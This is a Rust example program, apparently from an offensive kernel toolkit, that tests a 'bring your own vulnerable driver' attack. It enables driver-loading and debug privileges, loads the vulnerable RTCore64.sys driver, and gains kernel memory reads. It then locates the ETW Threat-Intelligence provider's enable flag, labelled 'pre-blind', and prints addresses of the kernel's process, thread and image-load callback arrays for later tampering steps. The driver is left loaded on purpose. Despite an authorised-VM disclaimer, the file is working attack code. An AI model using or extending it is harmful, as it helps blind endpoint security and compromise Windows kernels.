//! 任务 H：BYOVD bootstrap 真机测试（管理员运行）。
//!
//! 链路：
//!   bootstrap_byovd("RTCore64.sys") → LoadedDriver + ByovdDriver(KernelRw)
//!   → kernel_base::ntoskrnl_base()
//!   → KernelRw 读 ntoskrnl PE → resolve_kernel_symbol("EtwThreatIntProvRegHandle") → RVA
//!   → 打印 base / RVA / KVA
//!
//! 红线：每个后续内核写前先 kread 验证目标地址内容（本例只做读 + 打印，
//! 不写，所以是 BSOD-safe 的只读探测）。
//!
//! 编译（管理员 cmd，vcvars64 已加载）:
//!   cargo +nightly build --release --manifest-path crates\operator-kernelsdk\Cargo.toml \
//!     --target x86_64-pc-windows-msvc -Z build-std=core,alloc --example bootstrap_test
//! 运行:
//!   target\x86_64-pc-windows-msvc\release\examples\bootstrap_test.exe
//!
//! # Safety
//! 加载驱动进内核（不可逆，直到 unload）。仅在授权目标 + VM 上运行。



#[cfg(target_os = "windows")]
use nyx_operator_kernelsdk::byovd::resolve_kernel_symbol;
#[cfg(target_os = "windows")]
use nyx_operator_kernelsdk::etwti::EtwTiOffsets;
#[cfg(target_os = "windows")]
use nyx_operator_kernelsdk::win::{bootstrap_byovd, kernel_base};
// trait 方法 (kread/kread_u64) 必须在 scope 内才能在 ByovdDriver 上调用。
#[cfg(target_os = "windows")]
use nyx_operator_kernelsdk::KernelRw;
// ntdll!RtlAdjustPrivilege — 启用 token 特权。原型:
//   NTSTATUS RtlAdjustPrivilege(ULONG Privilege, BOOLEAN Enable,
//                               BOOLEAN CurrentThread, PBOOLEAN Enabled)
// SeLoadDriverPrivilege 的 LUID 恒为 10 (nt!SE_LOAD_DRIVER_PRIVILEGE)。
#[cfg(target_os = "windows")]
extern "system" {
    fn RtlAdjustPrivilege(
        privilege: u32,
        enable: i32,
        current_thread: i32,
        enabled: *mut i32,
    ) -> i32;
}

/// 启用 SeLoadDriverPrivilege (LUID 10)。管理员 token 默认 disabled，
/// NtLoadDriver 不启用它返回 STATUS_PRIVILEGE_NOT_HELD (0xC0000061)。
/// 同时启用 SeDebugPrivilege (20) —— 后续 I/J/K 的内核读需要它。
#[cfg(target_os = "windows")]
fn enable_privileges() {
    for (luid, name) in [
        (10u32, "SeLoadDriverPrivilege"),
        (20u32, "SeDebugPrivilege"),
    ] {
        let mut prev: i32 = 0;
        let status = unsafe { RtlAdjustPrivilege(luid, 1, 0, &mut prev) };
        // 0 = STATUS_SUCCESS; 0x40000011 = STATUS_PRIVILEGE_ALREADY_ENABLED.
        if status == 0 {
            println!("[priv] {} enabled (was {})", name, prev);
        } else if status as u32 == 0x4000_0011 {
            println!("[priv] {} already enabled", name);
        } else {
            eprintln!(
                "[priv] {} RtlAdjustPrivilege -> NTSTATUS 0x{:x}",
                name, status as u32
            );
        }
    }
}

/// UTF-16 NUL-terminated driver path, **relative to SystemRoot**
/// (`System32\drivers\RTCore64.sys`). This matches what `sc create binPath=`
/// writes and is the most broadly accepted ImagePath form: the IO manager
/// resolves it against `%SystemRoot%`. An absolute `\??\C:\...` path is
/// rejected on some builds (Server 2019 17763 → STATUS_INVALID_IMAGE_FORMAT
/// 0xC0000160). The driver file is also copied to
/// `C:\Windows\System32\drivers\RTCore64.sys`.
#[cfg(target_os = "windows")]
const SYS_PATH: &[u16] = &[
    'S' as u16,
    'y' as u16,
    's' as u16,
    't' as u16,
    'e' as u16,
    'm' as u16,
    '3' as u16,
    '2' as u16,
    '\\' as u16,
    'd' as u16,
    'r' as u16,
    'i' as u16,
    'v' as u16,
    'e' as u16,
    'r' as u16,
    's' as u16,
    '\\' as u16,
    'R' as u16,
    'T' as u16,
    'C' as u16,
    'o' as u16,
    'r' as u16,
    'e' as u16,
    '6' as u16,
    '4' as u16,
    '.' as u16,
    's' as u16,
    'y' as u16,
    's' as u16,
    0,
];
/// 服务名 `RTCore64`（不含 NUL —— bootstrap 会补）。
#[cfg(target_os = "windows")]
const SVC_NAME: &[u16] = &[
    'R' as u16, 'T' as u16, 'C' as u16, 'o' as u16, 'r' as u16, 'e' as u16, '6' as u16, '4' as u16,
];

/// 读取 ntoskrnl 镜像的字节数。17763 ntoskrnl ~9MB；读 10MB 留余量。
#[cfg(target_os = "windows")]
const NTOSKRNL_READ_SIZE: usize = 10 * 1024 * 1024;

/// ntoskrnl 符号 RVA —— 本机 build 17763.1339，PDB GUID
/// B02B8B6B1856887308455D5FCCAC7A8B / Age 1。
/// 这些是**非导出**的全局变量/数组，导出表 (resolve_kernel_symbol) 找不到，
/// 用 dbghelp + 从 MS 符号服务器下载的 ntkrnlmp.pdb 解析 (sym_lookup.ps1)。
/// PspCreateProcessNotifyRoutine=0x4D9D70 与 offsets.rs 文档记载完全吻合，证明解析正确。
/// 这些值**仅本 build 有效**——换机/换补丁必须重新解析。
#[cfg(target_os = "windows")]
mod rva {
    pub const ETW_THREAT_INT_PROV_REG_HANDLE: u32 = 0x40A6B0;
    pub const PSP_CREATE_PROCESS_NOTIFY_ROUTINE: u32 = 0x4D9D70;
    pub const PSP_CREATE_THREAD_NOTIFY_ROUTINE: u32 = 0x4D9970;
    pub const PSP_LOAD_IMAGE_NOTIFY_ROUTINE: u32 = 0x4D9B70;
    pub const PS_ACTIVE_PROCESS_HEAD: u32 = 0x40E5C0;
}

#[cfg(target_os = "windows")]
fn main() {
    println!(
        "[bootstrap_test] start (pid={}, integrity check via whoami /groups)",
        std::process::id()
    );

    // ---- 0. 启用 SeLoadDriver + SeDebug 特权 ----
    println!("[H.0] enabling SeLoadDriverPrivilege + SeDebugPrivilege ...");
    enable_privileges();

    // ---- 1. bootstrap BYOVD：加载驱动 + 打开设备 ----
    println!("[H.1] bootstrap_byovd(RTCore64) ...");
    let (mut loaded, krw) = unsafe {
        match bootstrap_byovd(SYS_PATH, SVC_NAME) {
            Ok(t) => t,
            Err(e) => {
                eprintln!("[FAIL] bootstrap_byovd: {}", e);
                std::process::exit(1);
            }
        }
    };
    println!("[OK] driver loaded + device opened (ByovdDriver ready)");

    // ---- 2. ntoskrnl 基址 ----
    println!("[H.2] kernel_base::ntoskrnl_base() ...");
    let base = match unsafe { kernel_base::ntoskrnl_base() } {
        Ok(b) => b,
        Err(e) => {
            eprintln!("[FAIL] ntoskrnl_base: {}", e);
            loaded.unload();
            std::process::exit(2);
        }
    };
    println!("[OK] ntoskrnl base = 0x{:016x}", base);

    // ---- 3. 读 ntoskrnl PE 头（红线 sanity：MZ + PE sig）----
    println!(
        "[H.3] kread ntoskrnl PE header ({} bytes) for sanity ...",
        0x400
    );
    let mut hdr = [0u8; 0x400];
    if let Err(e) = krw.kread(base, &mut hdr) {
        eprintln!("[FAIL] kread ntoskrnl header: {}", e);
        loaded.unload();
        std::process::exit(3);
    }
    if !(hdr[0] == b'M' && hdr[1] == b'Z') {
        eprintln!(
            "[FAIL] ntoskrnl @0x{:016x} is not MZ — base wrong or read failed",
            base
        );
        loaded.unload();
        std::process::exit(4);
    }
    let e_lfanew = i32::from_le_bytes([hdr[0x3c], hdr[0x3d], hdr[0x3e], hdr[0x3f]]) as usize;
    if &hdr[e_lfanew..e_lfanew + 4] != b"PE\0\0" {
        eprintln!("[FAIL] PE sig mismatch at base+0x{:x}", e_lfanew);
        loaded.unload();
        std::process::exit(5);
    }
    println!(
        "[OK] MZ + PE sig verified (e_lfanew=0x{:x}) — KernelRw read works",
        e_lfanew
    );

    // ---- 4. 解析 EtwThreatIntProvRegHandle (PDB RVA, 非导出) ----
    println!("[H.4] resolve EtwThreatIntProvRegHandle via PDB RVA ...");
    let etw_rva = rva::ETW_THREAT_INT_PROV_REG_HANDLE;
    let etw_kva = base + etw_rva as usize;
    println!("[OK] EtwThreatIntProvRegHandle:");
    println!("       RVA = 0x{:08x} (from PDB)", etw_rva);
    println!(
        "       KVA = 0x{:016x} (base 0x{:016x} + RVA)",
        etw_kva, base
    );

    // ---- 5. 红线：kread 目标地址内容（只读验证，零写风险）----
    println!("[H.5] kread EtwThreatIntProvRegHandle deref (sanity, read-only) ...");
    match krw.kread_u64(etw_kva) {
        Ok(guid_entry_ptr) => {
            println!(
                "[OK] *EtwThreatIntProvRegHandle = 0x{:016x} (GUIDEntry*)",
                guid_entry_ptr
            );
            if guid_entry_ptr == 0 {
                println!("[WARN] handle is NULL — ETW-TI provider not registered on this host");
            } else {
                let off = EtwTiOffsets::for_build(17763).unwrap();
                match krw.kread_u64(guid_entry_ptr as usize + off.guid_entry_to_provider_block) {
                    Ok(prov_block) => {
                        println!(
                            "[OK] GUIDEntry+0x{:x} → provider_block = 0x{:016x}",
                            off.guid_entry_to_provider_block, prov_block
                        );
                        if prov_block != 0 {
                            let is_enabled_kva = prov_block as usize
                                + off.provider_block_to_enable_info
                                + off.is_enabled_within_enable_info;
                            match krw.kread_u64(is_enabled_kva) {
                                Ok(v) => println!(
                                    "[OK] IsEnabled @0x{:016x} = 0x{:x} (1=enabled/pre-blind)",
                                    is_enabled_kva, v
                                ),
                                Err(e) => println!("[WARN] kread IsEnabled failed: {}", e),
                            }
                        }
                    }
                    Err(e) => println!("[WARN] kread GUIDEntry+0x20 failed: {}", e),
                }
            }
        }
        Err(e) => eprintln!("[WARN] kread EtwThreatIntProvRegHandle failed: {}", e),
    }

    // ---- 6. 顺便验证导出表解析器仍工作（拿个真导出符号对照）----
    let mut image = vec![0u8; NTOSKRNL_READ_SIZE];
    let _ = krw.kread(base, &mut image);
    if let Some(nt_rva) = resolve_kernel_symbol(&image, b"NtCreateFile") {
        println!(
            "[OK] export-resolver sanity: NtCreateFile RVA = 0x{:x}",
            nt_rva
        );
    } else {
        println!("[WARN] export-resolver could not find NtCreateFile (non-fatal)");
    }

    // ---- 7. 打印任务 I/J/K 所需的符号 KVA ----
    println!("\n[H.6] === symbol KVA table (for tasks I/J/K) ===");
    for (name, r) in [
        (
            "EtwThreatIntProvRegHandle",
            rva::ETW_THREAT_INT_PROV_REG_HANDLE,
        ),
        (
            "PspCreateProcessNotifyRoutine",
            rva::PSP_CREATE_PROCESS_NOTIFY_ROUTINE,
        ),
        (
            "PspCreateThreadNotifyRoutine",
            rva::PSP_CREATE_THREAD_NOTIFY_ROUTINE,
        ),
        (
            "PspLoadImageNotifyRoutine",
            rva::PSP_LOAD_IMAGE_NOTIFY_ROUTINE,
        ),
        ("PsActiveProcessHead", rva::PS_ACTIVE_PROCESS_HEAD),
    ] {
        println!(
            "       {:<32} RVA=0x{:08X} KVA=0x{:016x}",
            name,
            r,
            base + r as usize
        );
    }

    println!("\n[bootstrap_test] DONE — driver stays loaded for tasks I/J/K.");
    // 不主动 unload —— I/J/K 复用同一个驱动。
    std::mem::forget(loaded);
}


// ----------------------------------------------------------------------------
// Non-Windows entry-point fallback (E0601 mitigation).
//
// The real `fn main()` (and every Windows-only item above) is gated by
// `#[cfg(target_os = "windows")]`. This file is compiled as an example crate,
// which requires a `main` entry point; on macOS/Linux dev hosts the Windows
// body compiles to nothing and the build would fail with E0601 ("main
// function not found"). This stub exists solely to satisfy the crate root on
// non-Windows so `cargo build --examples` / `cargo test` stay green. It is
// mutually exclusive with the Windows `main` above and never runs on target.
// ----------------------------------------------------------------------------
#[cfg(not(target_os = "windows"))]
fn main() {
    eprintln!(
        "{} is a Windows-only kernel example (BYOVD driver load). It has no          effect on non-Windows hosts.",
        env!("CARGO_BIN_NAME")
    );
}
